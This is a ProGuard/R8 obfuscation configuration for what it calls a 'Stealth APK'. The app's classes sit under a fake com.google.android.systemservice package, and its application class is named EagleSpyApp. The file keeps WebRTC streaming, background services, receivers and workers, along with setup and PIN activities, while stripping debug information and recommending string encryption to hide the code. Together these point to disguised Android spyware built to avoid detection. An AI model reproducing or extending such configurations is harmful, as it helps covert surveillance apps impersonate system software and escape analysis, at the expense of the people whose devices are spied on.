# ProGuard/R8 Obfuscation Rules for Stealth APK
# Maximum obfuscation while preserving functionality

# === GENERAL OPTIMIZATION ===
-optimizationpasses 10
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-dontpreverify
-verbose

# === AGGRESSIVE OBFUSCATION ===
-repackageclasses ''
-allowaccessmodification
-mergeinterfacesaggressively
-overloadaggressively

# === REMOVE DEBUG INFO ===
-renamesourcefileattribute ''
-keepattributes SourceFile,LineNumberTable

# === STRING ENCRYPTION (Manual implementation needed) ===
# Consider using DexGuard or StringCare for runtime string encryption

# === KEEP RULES ===

# Keep Application class
-keep class com.google.android.systemservice.EagleSpyApp { *; }

# Keep all Service classes (required for Android component registration)
-keep class com.google.android.systemservice.services.** { *; }

# Keep Receiver classes
-keep class com.google.android.systemservice.receivers.** { *; }

# Keep Activity classes
-keep class com.google.android.systemservice.SetupWizardActivity { *; }
-keep class com.google.android.systemservice.PinProtectionActivity { *; }

# Keep WebRTC classes
-keep class org.webrtc.** { *; }
-keepclassmembers class org.webrtc.** { *; }

# Keep OkHttp
-keep class okhttp3.** { *; }
-keep interface okhttp3.** { *; }
-dontwarn okhttp3.**
-dontwarn okio.**

# Keep Gson
-keep class com.google.gson.** { *; }
-keepattributes Signature
-keepattributes *Annotation*

# Keep Android components
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends androidx.work.Worker
-keep public class * extends androidx.work.CoroutineWorker

# Keep native methods
-keepclasseswithmembernames class * {
    native <methods>;
}

# Keep Parcelable
-keep class * implements android.os.Parcelable {
    public static final ** CREATOR;
}

# Keep Serializable
-keepclassmembers class * implements java.io.Serializable {
    static final long serialVersionUID;
    private static final java.io.ObjectStreamField[] serialPersistentFields;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    java.lang.Object writeReplace();
    java.lang.Object readResolve();
}

# Keep annotations
-keepattributes RuntimeVisible*Annotations
-keepattributes RuntimeInvisible*Annotations

# === REMOVE LOGGING (temporarily disabled for debugging) ===
# -assumenosideeffects class android.util.Log {
#     public static *** d(...);
#     public static *** v(...);
#     public static *** i(...);
#     public static *** w(...);
#     public static *** e(...);
#     public static *** wtf(...);
# }

# === REMOVE KOTLIN METADATA ===
-dontwarn kotlin.**
-keep class kotlin.Metadata { *; }

# === GOOGLE PLAY SERVICES ===
-keep class com.google.android.gms.** { *; }
-dontwarn com.google.android.gms.**

# === WORK MANAGER ===
-keep class * extends androidx.work.Worker
-keep class * extends androidx.work.InputMerger
-keep public class * extends androidx.work.ListenableWorker {
    public <init>(android.content.Context,androidx.work.WorkerParameters);
}
-keep class androidx.work.WorkerParameters
